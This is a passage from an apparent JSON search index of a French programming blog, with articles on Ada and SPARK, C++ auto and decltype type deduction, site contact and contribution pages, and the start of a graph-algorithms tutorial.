de machines puissantes ce qui fait qu'il était très compliqué pour un particulier de pouvoir développer dans ce langage à cause de ces restrictions. Ada a été créé pour le domaine militaire à la base. De ce fait, certains programmeurs n'ont pas hésité à boycotter le langage de par sa provenance et de l'utilisation qu'il en était faite (des pacifistes aux « hippies » principalement). Le manque de ressources est un réel frein pour encourager des personnes à apprendre ce langage. En effet, les écrits qu'ils soient sur Internet ou sur papier semble dater d'assez longtemps (années 2000 pour la plupart). Cependant, pour motiver les éditeurs à publier de nouveaux livres pour Ada il faudrait une demande importante, mais cette demande est limitée en partie par le manque de ressources ; on tourne un peu en rond. Il n'existe pas d'application libre programmée en Ada et ayant connu une popularité suffisante pour motiver les programmeurs à s'essayer à ce langage. De plus le support de Windows a souvent été négligé ce qui a pu rebuter pas mal de potentiels nouveaux utilisateurs du langage. Comme vous pouvez le constater assez facilement, le fait que le langage ne soit pas l'un des plus populaires lui ternit son image récursivement de ce fait. Par exemple, les portages de bibliothèques populaires vers le langage Ada se font assez rares de par le manque de personnes compétentes pour effectuer et surtout maintenir ce portage. Comment programmer en Ada ? Trouver des cours Les ressources concernant Ada sont assez rares par rapport à ce que l'on peut trouver sur les langages C ou C++. Néanmoins, un cours intéressant au format PDF, en français et rédigé pour l'UIT d'Aix-En-Provence est disponible sur Developpez . On trouve également d'autres cours mais la plupart son en anglais, comme le tutoriel Lovelace ou cet autre tutoriel sur Wikibooks . Trouver des outils GNAT est un compilateur libre (GNU GPL) faisant partie de la fameuse suite GCC. Il permet de compiler des sources Ada en exécutables, cependant si vous êtes un adepte des IDE alors vous pourriez être intéressé par GPS, l'IDE développé par ceux qui maintiennent actuellement Ada. Comme vous avez pu le remarquer, Ada est souvent également utilisé dans les domaines de l'embarqué. Si vous souhaitez vous aussi tenter l'expérience de l'embarqué avec Ada, sachez qu'il existe un compilateur nommé avr-ada qui permet de compiler du code Ada pour les microcontrôleurs AVR d'ATMEL (incluant donc les cartes Arduino qui sont souvent basées sur ce genre de microcontrôleurs). Un petit mot sur SPARK J'aimerai finir cet article en vous parlant du langage SPARK. C'est un sous-ensemble du langage Ada (cela implique que l'on peut compiler du code SPARK en utilisant un compilateur Ada sans aucun problème mais l'inverse n'est pas vrai). Il est destiné à être employé dans les systèmes critiques et apporte des sécurités en plus au langage via l'utilisation de commentaires possédants un formatage spécifique. Ceux-ci permettent de, par exemple, dire que la fonction sur laquelle on travaille de devrait jamais toucher aux variables globales. Cela peut se traduire en SPARK de la façon suivante : procedure Increment ( X : in out Counter_Type ); --# derives X from X; Cette notation dit que la procédure n'utilisera aucune variable globale et qu'elle n'aura besoin que de la valeur de X en entrée pour assigner X en sortie (ce qui est bel et bien le cas pour réaliser une incrémentation). Si on veut signaler qu'une procédure utilisera une variable globale pour effectuer certaines opérations, on peut alors le spécifier comme ceci : procedure Increment ( X : in out Counter_Type ); --# global Count; Et en rajoutant des annotations derives pour consolider les vérifications. De cette manière, on peut s'assurer que l'appel à une fonction n'entrainera pas de modifications sur des variables globales qui peuvent être sensibles telles que par exemple la profondeur d'enfoncement des tiges dans un réacteur nucléaire. De plus, ces vérifications seront effectuées lors de la compilation du programme à l'aide d'une analyse statique du code et non pas à l'exécution, ce qui pourrait être dangereux. Ainsi, SPARK permet de sécuriser encore plus le développement d'applications à l'aide d'Ada dans les domaines où les erreurs logicielles peuvent avoir des conséquences dramatiques. Conclusion J'espère que cet article vous aura permis de mieux comprendre les enjeux de l'utilisation d'Ada au sein de notre société dans laquelle l'informatique prend de plus en plus de place. Grâce à Ada et aux concepts sur lesquels ce langage repose tels que le typage fort et la maintenabilité, on peut réaliser des programmes à la fois stables, sûrs et performants prêts à être employés sur le terrain. N'hésitez pas à parcourir la toile et les livres à propos d'Ada pour en savoir encore plus et pourquoi pas vous lancer dans son apprentissage ! Sources : Ada (Programming language) Ada Programming Information for new Ada95 programmers Who's Using Ada? Apprendre à programmer avec Ada"},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/c-auto-et-decltype","title":"C++, auto et decltype","text":"La détection de type par le compilateur est une fonctionnalité intéressante qui nous permet d'éviter de la redondance dans le code. Plusieurs langages modernes intègrent cette fonctionnalité. Or, avant 2011, la seule déduction de type qui existait en C++ était celle des templates. Mais avec C++11 sont apparus deux nouveaux mots-clefs : auto et decltype . Durant ce tutoriel, nous allons voir ce qu'ils peuvent nous apporter, les règles de détection de type qu'ils emploient, les points auxquels faire attention afin que ces deux mots-clefs n'ait plus de secret ! Information : Premièrement, les codes montrés en exemple sont inspirés de ceux écrits par Scott Meyers dans son livre Effective Modern C++ , comme autorisé par l'auteur, tout comme certaines explications. Deuxièmement, pour pouvoir tester les codes mis en exemple, il faut au minimum un compilateur supportant C++11. Pour les exemples illustrant C++14, là encore, il faut un compilateur bien à jour. Dans mon cas, il s'agit de GCC 5.1.0 sous Archlinux. À noter également que bien que facultatif pour la compréhension de ce tutoriel, boost est nécessaire pour tester la partie où l'on affichera le type d'un objet. Les règles de déduction des templates Pointeur ou référence Références universelles Passage par recopie Les tableaux C Les règles de fonctionnement de auto Mais qu'est-ce que decltype ? Petite particularité de decltype Connaître et afficher le type exact Quand les utiliser ? Les règles de déduction des templates Avant d'aller plus loin, il est important de comprendre comment les templates fonctionnent, puique auto va utiliser quasiment les mêmes règles. Pour cela, nous allons utiliser une bête fonction comme celle-là. template < typename T > void foo ( ParamType param ); Non seulement il faut déduire le type de T, mais également ParamType, qui n'est pas forcément le même. On peut en effet y trouver const ou une référence par exemple. Ainsi, dans le code suivant, si T est de type int , ParamType est de type const int & . template < typename T > void foo ( const T & param ); int x = 0 ; foo ( x ); Dans ce cas, c'est tout à fait normal que, donnant un int en argument, T soit déduit comme int . Cependant, T ne dépend pas que de ce qu'on passe en argument à la fonction, mais aussi de la forme de ParamType. Il existe trois cas possibles. ParamType est un pointeur ou une référence. ParamType est une référence universelle. ParamType n'est ni un pointeur ni une référence. [[attention]] | La notion de référence universelle est trop longue pour être expliquée ici, surtout que Scott Meyers a écrit un article dessus. Tout ce qu'il y a à savoir pour lire la suite du tutoriel est qu'une référence universelle peut se comporter comme une rvalue-reference T&& ou comme une lvalue-reference T& ; elles se rencontrent dans deux cas. | | c++ | template <typename T> | void foo(T && param); | | auto && y = x; | Pointeur ou référence C'est la situation la plus facile à comprendre, puisque les règles sont simples : si l'argument fourni lors de l'appel de foo est une référence ou un pointeur, on ignore la dite référence ou le dit pointeur. Examinons un exemple tout simple. template < typename T > void foo ( T & param ); int x = 0 ; // x est de type int foo ( x ); // T est de type int et ParamType est de type int& const int y = x ; // y est de type const int foo ( y ); // T est de type const int, ParamType est de type const int& const int & z = x ; // z est de type const int&, soit une référence sur un const int foo ( z ); // T est de type const int, ParamType est de type const int& Comme dit précédemment, on remarque bien que la référence est supprimé. Par contre, const est conservé et c'est bien normal : quand on passe un objet const à une fonction prennant une référence comme paramètre, on s'attend bien à ce que l'objet reste const et ne soit pas modifiable, d'où ParamType qui sera de type const T & . Le même comportement est observable avec des pointeurs (bien qu'un bon programmeur C++ n'utilise que le moins possible les pointeurs nus). template < typename T > void foo ( T * param ); int x = 0 ; // x est de type int foo ( & x ); // T est de type int, ParamType est de type int* const int * ptr = & x ; // ptr est de type const int*, soit un pointeur sur un const int foo ( ptr ); // T est de type const int, ParamType est de type const int* Les déductions du compilateur changent un petit peu dans le cas où ParamType est de type const T & (ou const T * ). En effet, dans ce cas, puisque ParamType est déjà de type const , alors T n'a plus besoin d'être déduit comme const lui aussi, même si l'argument donné est const . Pas clair ? Voyons ça avec du code. template < typename T > void foo ( const T & param ); int x = 0 ; // x est de type int f ( x ); // T est de type int et ParamType est de type const int&, tout est normal const int y = x ; // y est de type const int f ( y ); // ParamType est déjà const, donc T sera de type, non pas const int, mais simplement int et ParamType sera de type const int& const int & z = x ; // z est de type const int &, soit une référence sur un const int f ( z ); // ParamType est déjà const, donc T sera simplement int et ParamType sera de type const int&. On note que les règles sur les références vues juste avant s'appliquent encore ici. Quand on y réfléchit, c'est normal. Si ParamType est déjà const , il est superflu et redondant de dire que T l'est aussi. Jusque là, tout est logique et la déduction de type fonctionne exactement comme ce à quoi on s'attend. Références universelles Là, les choses se complexifient un peu. En effet, le comportement n'est pas le même en fonction de si l'on passe en argument une lvalue ou une rvalue. Dans le cas d'une lvalue, T et ParamType sont déduits comme étant des lvalue-references. C'est le seul cas dans les règles de déduction des templates que T conserve sa référence. L'autre point surprenant est que bien que ParamType soit déclaré comme une rvalue ( T && param ), le compilateur en déduit que c'est une lvalue-reference. Dans le cas d'une rvalue, les règles vues dans la section pointeurs / références s'appliquent. template < typename T > void foo ( T && param ); int x = 0 ; // x est une lvalue de type int foo ( x ); // x étant une lvalue, T et ParamType sont déduits comme int& const int y = x ; // y est une lvalue de type const int foo ( y ); // y étant une lvalue, T et ParamType sont déduits comme const int& const int & z = x ; //z est une lvalue de type const int& foo ( z ); // z étant une lvalue, T et ParamType sont déduits comme const int& foo ( 0 ); // 0 est une rvalue, donc T est déduit comme int et ParamType comme int&& La chose importante à retenir est que les règles ne sont pas les mêmes si l'on a affaire à une lvalue ou à une rvalue. Dans le premier cas, les règles que nous venons de voir s'appliquent ; dans le second cas, les règles classiques , celles vues pour les pointeurs et les références, s'appliquent. Le pourquoi exact de ces comportements est néanmoins trop complexes pour être examiné ici ; des recherches sur Internet peuvent néanmoins être menées par ceux désireux de comprendre les raisons. Passage par recopie Quand le prototype de notre fonction ne comporte ni pointeur ni référence, alors c'est qu'on à affaire à un passage par copie. template < typename T > void foo ( T param ); Si l'expression passée en argument contient référence ou pointeur, ceux-ci sont ignorés. Classique. Par contre, et c'est là qu'est la différence, si l'expression contient const (ou plus rarement volatile ), ceux-ci sont ignorés également. La raison est toute simple : puisque on recopie les arguments donnés à la fonction, on ne manipule plus l'objet original mais un nouvel objet totalement indépendant du premier ; le fait que l'original ne soit pas modifiable ne veut pas dire que sa copie ne peut pas l'être non plus. int x = 0 ; // x est de type int foo ( x ); // T et ParamType sont de type int const int y = x ; // y est de type const int foo ( y ); // T et ParamType sont de type int const int & z = x ; // z est de type const int& foo ( z ); // T et ParamType sont de type int Les tableaux C Bien qu'un bon programmeur C++ moderne utilise std::array à la place des tableaux C, le monde n'est pas parfait et il y aura des cas où l'on devra traiter avec cet héritage du C. Et il y a aussi les curieux qui veulent connaître ces petits détails. Alors soit, explorons. Les tableaux C ne constituent pas un quatrième cas mais rentrent dans les précédents, comme nous allons le voir. Tout d'abord, il est important de savoir qu'il est impossible de passer un tableau par recopie. En effet, les règles héritées du C impliquent que dans quasiment toutes les situations, un tableau est converti en un pointeur constant sur son premier élément. Les deux fonctions suivantes sont donc strictement identiques . void foo ( int * param ); void foo ( int param []); Dans le cas d'une fonction par recopie, si on lui donne un tableau, le compilateur interprètera ça comme un pointeur. template < typename T > void foo ( T param ); const char string [] = \"Zeste de Savoir\" ; // string est de type const char[15] foo ( string ); // conversion en pointeur, T sera déduit comme un const char* Par contre, et là ça devient plus amusant, on peut déclarer une fonction prenant une référence sur un tableau. Comme la logique le veut, on va suivre les règles établies dans le cas 1 et surprise ! le type déduit pour T est celui du tableau ! template < typename T > void foo ( T & param ); const char string [] = \"Zeste de Savoir\" ; // string est de type const char[15] foo ( string ); // suivant les règles, T sera de type const char[15] lui aussi Sur de nombreux forums, on trouve le code suivant qui permet de connaître, à la compilation, la taille d'un tableau C. Maintenant, après avoir lu jusqu'ici, vous êtes en mesure de comprendre et d'expliquer le comment de ce code. template < typename T , std :: size_t N > inline constexpr std :: size_t array_size ( T ( & )[ N ]) noexcept { return N ; } Désormais, les régles qu'utilise le compilateur n'ont plus de secret pour nous. Enfin presque. Il reste sans doute des cas exotiques et particuliers qui ne sont pas nécessaires pour bien comprendre l'article. Ceux qui le souhaitent peuvent continuer leurs recherches sur le sujet. Pour les autres, passons maintenant à auto . Les règles de fonctionnement de auto Les règles de déduction de auto sont les mêmes que celles des templates ... sauf une petite exception. Mais commençons simple et voyons de comportements tout à fait normaux auxquels on s'attend. // Cas classiques auto x = 0 ; // 27 est de type int, donc x aussi const auto y = x ; // x est de type int, donc y sera de type const int const auto & z = x ; // x est de type int, donc z sera de type const int& // Références unverselles auto && universal_x = x ; // x est une lvalue de type int, donc universal_x est de type int& auto && universal_y = y ; // y est une lvalue de type const int, donc universal_y est de type const int& auto && universal_right = 27 ; // 27 est une rvalue de type int, donc universal_right est de type int&& // Tableaux const char site [] = \"Zeste de Savoir\" ; auto pointer = site ; // pointer est de type const char* auto & array = site ; // array est de type char (&)[15] Jusque là, rien de surprenant, les règles appliquées sont bien les mêmes que pour les templates. La seule différence qui existe entre les règles de déduction appliquées aux templates et celles appliquées à auto viennent de la nouvelle façon d'initialiser une variable, introduite avec C++11. En effet, en plus des syntaxes \"classiques\", on retrouve deux nouvelles formes. int x1 = 27 ; int x2 ( 27 ); int x3 = { 27 }; int x4 { 27 }; Or, en remplaçant int par auto , si l'on obtient bien le type int pour les deux premières formes, on obtient un std::initializer_list<int> dans les deux dernières formes, contenant 27 comme unique élément ! Et pour vous convaincre que les règles de auto et des templates sont bien différentes dans ce cas, examinez le code suivant. template < typename T > void foo ( T param ) { } template < typename T > void bar ( std :: initializer_list < T > list ) { } int main () { auto x = { 1 , 2 , 3 }; // x est bien un std::initializer_list<int> contenant 1, 2 et 3 foo ({ 1 , 2 , 3 }); // erreur: no matching function for call to ‘foo(<brace-enclosed initializer list>)' bar ({ 1 , 2 , 3 }); // ici tout va bien return 0 ; } Alors que pour auto tout va bien, si l'on tente de faire de même avec foo , alors le compilateur nous envoie boûler. Pour qu'il accepte le code, il faut le même prototype que la fonction bar , soit std::initializer_list<T> . Voilà tout pour C++11 Mais avec C++14, l'histoire change encore un peu. En effet, avec cette nouvelle révision de la norme, il est possible d'écrire des fonctions dont le type devra être déduit (ou dit vulgairement, retournant auto ) ; de même, on peut utiliser auto dans les paramètres des lambdas. Sauf que là, l'utilisation du mot-clef auto n'entraîne pas l'utilisation des règles de déduction de auto mais ... des templates ! Exemples ? auto create_initialisation_list () { return { 1 , 2 , 3 }; // erreur: returning initializer list } int main () { std :: vector < int > v ; auto reset = [ & v ]( const auto & new_value ) { v = new_value ; }; reset ({ 1 , 2 , 3 }); // erreur: no match for call to ‘(main()::<lambda(const auto:1&)>) (<brace-enclosed initializer list>)' // note: template argument deduction/substitution failed : couldn't deduce template parameter ‘auto:1' return 0 ; } Compliqué hein ? En vérité, si l'on excepte ces quelques cas particuliers, auto et les templates suivent les mêmes règles. Voici un petit résumé pour aider à bien mémoriser toutes ces informations. auto et les templates ont les mêmes règles de déductions sauf en présence de crochets {}, auquel cas auto déduit qu'il est en présence de std::initializer_list alors que les templates non. En C++14, s'il est le type de retour d'une fonction ou le type d'un argument de lambdas, alors auto utilise les mêmes règles de déduction que les temples (notamment sur les std::initializer_list ). Mais qu'est-ce que decltype ? Peut-être vous-êtes vous posés la même question que moi la première fois que vous avez vu decltype . Le mot-clef en lui même est très simple : il renvoie le type exact d'une expression ou d'un identificateur qu'on lui donne. Exemples ? int a = 0 ; // decltype(a) est int const int b = 0 ; // decltype(b) est const int class A ; A instance_de_A ; // decltype(instance_de_A) est A; const A & instance_2_de_A = instance_de_A ; // decltype(instance_2_de_A) est const A& double foo ( const std :: string & value ); // decltype(foo) est double(const std::string&) decltype ( if ( 0 == 0 )) est bool Ces quelques exemples, s'ils illustrent comment decltype fonctionne, sont assez inutiles, avouons-le. La principale utilisation de decltype en C++11 est dans le cas où une fonction template retourne une valeur qui dépend de ses paramètres. template < typename LHS , typename RHS > auto add ( LHS lhs , RHS rhs ) -> decltype ( lhs + rhs ) { return lhs + rhs ; } auto i = add ( 1 , 1 ); // int auto j = add ( 1 , 1.0 ); // double Attention , l'utilisation de auto ici ne veut pas dire que ce sont les règles vues précédemment pour auto qui s'appliquent, mais plutôt que l'on utilise la syntaxe de déduction avec decltype . En effet, avec decltype , on peut utiliser des paramètres de la fonction pour déterminer le résultat, ce qui ne serait pas possible si on devait écrire le type de retour de la fonction à la place de auto . Mais il faut admettre que c'est un peu long à écrire et même redondant, comme le montre le code ci-dessous (tiré d'un article de Scott Meyers, où l'on répète deux fois la même chose. template < typename Container , typename Index > auto grab ( ContainerType && container , IndexType && index ) -> decltype ( std :: forward < ContainerType > ( container )[ std :: forward < IndexType > ( index )]) // Déjà que le contenu de decltype est long ... { authenticateUser (); return std :: forward < ContainerType > ( container )[ std :: forward < IndexType > ( index )]; // ... mais en plus on doit réécrire la même chose ici ! } L'idéal serait de faire pour les fonctions ce qui est possible dès C++11 avec les lambdas : ne pas avoir à expliciter le type de retour. []( int rhs , int lhs ) -> int { return rhs + lhs ; }; // ok []( int rhs , int lhs ) { return rhs + lhs ; }; // ok Eh bien, avec C++14, c'est possible, en utilisant auto . Maintenant, un code comme celui-ci est parfaitement valide. template < typename LHS , typename RHS > auto add ( LHS lhs , RHS rhs ) { return lhs + rhs ; } Mais du coup, est-ce que decltype est devenu inutile en C++14 ? Eh bien non. Si l'on se souvient bien de la partie précédente, on sait que auto ne conserve pas la référence ou le pointeur de ce qu'il évalue. Et si l'on reprend le code de Scott Meyers vu précédemment, ça peut poser un grave problème. Par exemple, si l'opérateur [] appliqué à un std::vector<int> renvoie bien un int , ce même opérateur appliqué à un std::vector<bool> renvoie un bool& . Si on n'utilise que auto , on perdra la référence. On ne peut pas non plus utiliser decltype avant le début de la fonction, puisque on ne sera pas encore dans sa portée et on ne pourra donc pas utiliser ses paramètres pour la déduction de type. Et comme dit le proverbe, \"l'union fait la force\" ; la réponse est d'utiliser en même temps decltype et auto . template < typename Container , typename Index > auto grab ( ContainerType && container , IndexType && index ) -> decltype ( auto ) // Le type de retour est déjà beaucoup moins long et n'est plus redondant { authenticateUser (); return std :: forward < ContainerType > ( container )[ std :: forward < IndexType > ( index )]; } Tout est logique : auto indique que le type doit être déduit et decltype précise que les règles de déduction seront les siennes et non celles de auto . Et comme nous sommes des fainéants par nature, nous disposons d'un moyen d'écrire ça encore plus simplement. template < typename Container , typename Index > decltype ( auto ) grab ( ContainerType && container , IndexType && index ) // Voilà qui est parfait ! { authenticateUser (); return std :: forward < ContainerType > ( container )[ std :: forward < IndexType > ( index )]; } Et le meilleur dans tout ça, c'est que cette syntaxe peut s'utiliser autre part que dans les retours de fonction ; en fait, elle se place partout où auto peut être utilisé pour une déduction de type, mais reprend le même comportement que decltype . // Fini ça ... decltype ( longAndComplexInitializingExpression ) var = longAndComplexInitializingExpression ; // ... place à la concision ! decltype ( auto ) var = longAndComplexInitializingExpression ; Petite particularité de decltype Comme rien n'est parfait en ce bas-monde, il y aura parfois des moments où decltype vous surprendra en vous donnant un type auquel vous ne vous attendiez pas. S'il retourne bien le type d'un identificateur qu'on lui donne, pour des expressions lvalues un peu plus compliquées, decltype déduit qu'elle est une lvalue-reference ; autrement dit, si une expression un peu complexe est de type T , decltype la déduira comme étant de type T& . int x = 0 ; decltype ( x ); // est bien de type int decltype (( x )); // (x) est une expression lvalue, donc le type déduit est int& Le danger se présente avec C++14 et l'utilisation conjointe de decltype et auto . Ainsi, si vous aviez l'habitude d'entourer de parenthèses le retour d'une fonction, vous allez avoir quelques surprises. decltype ( auto ) foo () { int x = 0 ; ... return x ; // decltype(x) est un int, pas de problème } decltype ( auto ) bar () { int x = 0 ; ... return ( x ); // decltype((x)) est un int&, une référence sur une variable locale ! } La leçon ? Rester prudent lorsqu'on utilise decltype et auto ensembles pour éviter les mauvaises surprises. Connaître et afficher le type exact Bien que connaître et comprendre les règles des templates, de auto et de decltype puisse grandement nous aider à savoir quel type est déduit, il se peut que l'on ait besoin d'afficher le type d'une expression ou d'un identificateur. La meilleure solution est celle fournie par Boost avec l'en-tête <boost/type_index.hpp> . Bien qu'il faille Boost d'installé, cet en-tête ne nécessite pas d'être compilé pour être utilisé. Et comme un code vaut mille mots, voici une petite illustration compilée avec GCC 5.1.0 sous Archlinux. #include <boost/type_index.hpp> #include <iostream> #include <memory> #include <string> #include <vector> template < typename T > void foo ( const T & param ) { using boost :: typeindex :: type_id_with_cvr ; std :: cout << \"T = \" << type_id_with_cvr < T > (). pretty_name () << std :: endl ; std :: cout << \"param = \" << type_id_with_cvr < decltype ( param ) > (). pretty_name () << std :: endl ; std :: cout << std :: endl ; } int main () { foo ( 3.1415926 ); foo ( \"Hello with C-string\" ); auto ptr = std :: make_unique < int > ( 42 ); foo ( ptr ); const std :: string str ( \"Hello with C++ std::string\" ); foo ( str ); const std :: vector < float > v ; foo ( v ); auto lambda = []() -> int { return 42 ; }; foo ( lambda ); return 0 ; } T = double param = double const& T = char [20] param = char const (&) [20] T = std::unique_ptr<int, std::default_delete<int> > param = std::unique_ptr<int, std::default_delete<int> > const& T = std::string param = std::string const& T = std::vector<float, std::allocator<float> > param = std::vector<float, std::allocator<float> > const& T = main::{lambda()#1} param = main::{lambda()#1} const& N'hésitez pas à jeter un œil à la documentation pour en apprendre plus sur cet outil précieux. Quand les utiliser ? Tu ne sais pas penser de ces nouveautés et tu es tout perdu ? Pour t'aider, voici des avis de différents programmeurs, récoltés sur Internet. Principalement pour les types moches et à rallonge, avec plein de templates dedans. De temps à autre je tente du AAA, mais sans trop me forcer à l'utiliser. *[AAA]: Almost Always Auto Source: Luthaf auto : je l'utilise quand le type est très long, souvent avec la ST(L) et ses noms template à rallonge en retour de fonction. Mais quand je sais ce que je vais manipuler bien sûr (des itérateurs, conteneurs, etc.). Je l'utilise aussi pour des types numériques qui peuvent varier dans le temps (passer de float à double par exemple), ça permet de gagner pas mal de temps ! decltype : je l'utilise moins que le précédent mais lorsque je m'en sers c'est souvent avec auto (pas decltype(auto)), pour bien montrer que le type d'une variable doit absolument être le même que celui d'une autre. Source: zeFresk Sinon, je mets auto quand la variable est initialisée avec une autre variable ou avec un retour de fonction. Dans les autres cas, j'appelle directement le constructeur T x{...}; et non pas auto x = T{...} . Aussi dans les boucles sur intervalle (sauf si l'IDE décide de ne pas reconnaître le type... -_-). Je ne le mets pas quand je veux une interface. À la place, je mets le type de l'interface. Je ne l'utilise pas quand il y a std::reference_wrapper , sinon il faut mettre machin.get() partout. Je trouve ça regrettable en fait, j'espère que la proposition de surcharge de l'opérateur . va être accepté (pas du tout suivit le truc). (D'ailleurs, je remplace souvent reference_wrapper par à un proxy rien que pour cette raison...) decltype quand j'ai besoin de construire une variable du même type. Généralement, dans un alias ( using Truc = decltype(machin) ). Source: jo_link_noir Salut ! Mon avis : auto : souvent pour les types qui peuvent changer ( float , double notamment), presque toujours pour les variables initialisées par un retour de fonction ( make_shared , make_unique , begin pour ne donner que des exemples de la SL) ; decltype : dans des arguments de fonction qui ont deux fois le même type (exemple : maFonction(UnTypeComplique::iterator first, decltype(first) last)) , rarement en d'autres circonstances decltype(auto) : je n'ai jamais rencontré un cas de figure ou j'ai eu à l'utiliser, et je préfère l'éviter car je le trouve peu explicite, car il faut aller voir quels qualificateurs ( const , volatile , référence) marquent la \"variable source\", ce qui est peu lisible. Je préfère dans ce cas réécrire auto const& par exemple. Source: mehdidou99 Les auto , c'est bien, mangez-en. Source: gbdivers Personnellement, je suis dans la même optique que @jo_link_noir , j'utilise auto quand je crée un élément qui est dépendant d'un autre. Pour decltype , j'ajouterai une autre petite utilisation que pour la création d'un alias : une dépendance de type mais où la première utilisation ne nous donne pas l'info. Cas typique : ```c++ std::vector v; //... for(decltype(v)::size_type i = 0; i < v.size(); ++i){ } ``` Après, dans ce cas, on aura effectivement envie de définir le type avant avec un using. Source: Ksass`Peuk Use auto if a reference type would never be correct . Use decltype(auto) only if a reference type could be correct. Source: Scott Meyers Un peu de StackOverflow . Encore un peu plus . Et du cplusplus.com aussi. J'espère que, par la lecture de ce tutoriel, vous en savez désormais plus sur le fonctionnement des templates, de auto et de decltype . Ce sont des fonctionnalités vraiment intéressantes qui font du C++ un langage frais et moderne (propos absolument subjectif). Libre à vous désormais de les adopter !"},{"tags":"pages","url":"https://yliesc.github.io/pages/contact","title":"Contact","text":"Par email Ce formulaire de contact utilisant Formspree vous permet de me contacter par email. N'hésitez pas, si il y a bien un moyen de me contacter de manière sûre, c'est celui là. Send var contactform = document.getElementById('contactform'); contactform.setAttribute('action', '//formspree.io/' + 'ylies' + '@' + 'thegoldenkoala' + '.' + 'com');"},{"tags":"pages","url":"https://yliesc.github.io/pages/contribute","title":"Contribuer","text":"Ce site a pour volonté d'être le plus transparent et ouvert possible. Dans cette optique, il vous est possible d'éditer chaque page/article de ce site de manière très simple. Ce site est comme un logiciel libre : tout son code source est disponible et modifiable. Vous trouverez sur chacune des pages/articles, dans la barre latérale, un bouton « Modifier la page sur GitHub » ou « Modifier l'article sur GitHub ». Il ressemble à ceci : En cliquant dessus, vous serez rediriger sur le site web GitHub qui héberge le code source du site. Vous pourrez donc le modifier . Nécessite un compte GitHub Toutefois après avoir cliqué sur ce bouton, vous noterez rapidement que GitHub requiert d'ouvrir un compte pour aller plus loin. Cela peut vous rebuter, mais sachez que vous n'aurez besoin de créer ce compte qu'une fois pour modifier toutes les pages de ce site (et même d'autres sites proposant cette fonctionnalité). Ce fonctionnement permet à tous de corriger une faute de frappe, une mauvaise tournure de phrase, ou même de proposer de nouveaux contenus sans attendre ! Est soumis à modération Bien sûr, vous ne pouvez pas modifier le site sans contrôle de ma part. Mais sachez que grâce à GitHub, je peux très rapidement répondre à votre proposition : il me suffit de cliquer sur un bouton, et hop ! vos modifications apparaissent dans les secondes qui suivent. Créer une nouvelle page, un nouvel article Ajouter un article Pour ajouter un article sur ce blog, cela revient à ajouter un fichier au format YYYY-MM-DD-nom-article.md dans le répertoire content/ , (par exemple 2017-04-28-article-du-28-avril ), de rédiger son contenu en s'inspirant d'autres articles déjà existants pour finalement envoyer une pull request via le bouton dédié sur GitHub. Ajouter une/des pages L'ajout d'une page sur ce blog est au moins aussi trivial que l'ajout d'un article. En fait, il vous suffit d'ajouter un fichier au format nom-de-la-page.md dans le répertoire content/pages/ ou l'un de ses sous-répertoires selon la catégorie visée. Une fois cette étapes de faite, il suffit juste de rédiger votre contenu et d'envoyer une pull request via le bouton dédié sur GitHub. De mon côté, la validation est toujours un simple bouton."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/decouverte-des-algorithmes-de-graphe","title":"Découverte des algorithmes de graphe","text":"Ce tutoriel va vous expliquer ce qu'est un graphe, et à quoi il sert. Il détaillera les algorithmes de graphe les plus courants, en indiquant leur complexité en temps et en mémoire, avec peut-être des schémas si vous êtes sages. Chaque algorithme sera accompagné d'un pseudo-code pour laisser au programmeur l'opportunité de le coder dans son langage favori. Le cours est ouvert aux contributions : vous pouvez m'envoyer une implémentation de l'algorithme dans le langage de votre choix et je l'y ajouterais. Il sera appuyé d'exemples concrets pour que l'intérêt de chaque algorithme apparaisse dans une situation courante. L'objectif est d'apprendre à reconnaître des problèmes de graphe, ou à modéliser un problème sous forme de graphe, pour le résoudre avec des outils éprouvés et efficaces. Ce document n'a pas pour ambition de faire une démonstration formelle de la complexité ou de la validité des algorithmes. Il n'a aucune vocation académique. Les concepts seront présentés de façon intuitive et didactique pour permettre à tous de les appréhender et de les appliquer aisément. Il se veut être une \"boîte à outils\" aussi bien qu'un moyen de découvrir ce domaine de l'algorithmique. Le formalisme et la rigueur ont été sacrifiés sur l'autel de la simplicité, mais pas l'exactitude ni la précision. Pour suivre ce tutoriel vous devez Savoir programmer (variables, boucles, tableaux, fonctions) Avoir des notions de base en algorithmique : récursivité, structures de données courantes, tris... Comprendre ce qu'est la complexité (facultatif mais utile) Graphes et représentation de graphe Dessine moi un graphe ! Le graphe Une carte, un labyrinthe, un lieu... et la recherche de chemins Des relations entre individus L'ordonnancement de tâches : le tri topologique Minimiser l'usage de ressources avec les arbres couvrants minimaux Tromper votre ennui en géographie en coloriant des cartes Poster du courrier ...et tout le reste ! Un peu de vocabulaire Quelques conventions et notations... Graphe simple ou multigraphe Connexité Graphes orientés et non-orientés Graphes pondérés Graphes cycliques Densité d'un graphe et degré d'un nœud Arbre Représentations et stockage en mémoire Généralités La liste d'adjacence La matrice d'adjacence Parcourir un graphe Le parcours en profondeur et le labyrinthe Les pyramides Le parcours en profondeur Luke, je suis ton père Le parcours en largeur et le buzz Big Buzz Le parcours en largeur Le prix du succès L'exhaustif et Uno L'exhaustif Graphes et représentation de graphe Dans ce chapitre vous verrons la définition d'un graphe, ainsi que ses différentes caractéristiques remarquables. Nous donnerons un premier aperçu des problèmes pouvant être identifiés comme des problèmes de graphe. Puis nous étudierons les deux principaux moyens de le stocker en mémoire. Dessine moi un graphe ! Le graphe Citation : Wikipédia Un graphe est un ensemble de points, dont certaines paires sont directement reliées par un (ou plusieurs) lien(s). Ces points sont nommés nœuds ou sommets . Ces liens sont nommés arêtes . Notez bien que ces fameux points n'ont pas de position absolue dans le plan, ni de position relative les uns aux autres. De la même façon, les arêtes ne sont pas forcées d'être droites (bien que conventionnellement on les représente comme tel par soucis de lisibilité) : elles peuvent être courbes ou faire des détours, etc... Ainsi un graphe n'est pas une figure, bien que l'on puisse représenter un graphe par une figure. Les graphes ne se cantonnent donc pas à des considérations d'ordre purement géométrique, bien au contraire ! En effet, un graphe sert avant tout à manipuler des concepts, et à établir un lien entre ces concepts . N'importe quel problème comportant des objets avec des relations entre ces objets peut être modélisé par un graphe. Il apparaît donc que les graphes sont des outils très puissants et largement répandus qui se prêtent bien à la résolution de nombreux problèmes. En voici quelques uns. Une carte, un labyrinthe, un lieu... et la recherche de chemins Il s'agit d'un cas très classique, notamment dans le domaine du jeu vidéo. Chaque nœud représente une position (ici une case libre) et chaque arête correspond à un chemin entre deux positions (ici deux cases libres adjacentes). Il est courant de chercher le chemin le plus court entre deux positions : les IA s'en servent pour déplacer les créatures aussi vite que possible dans le monde virtuel. En remplaçant les nœuds par des adresses 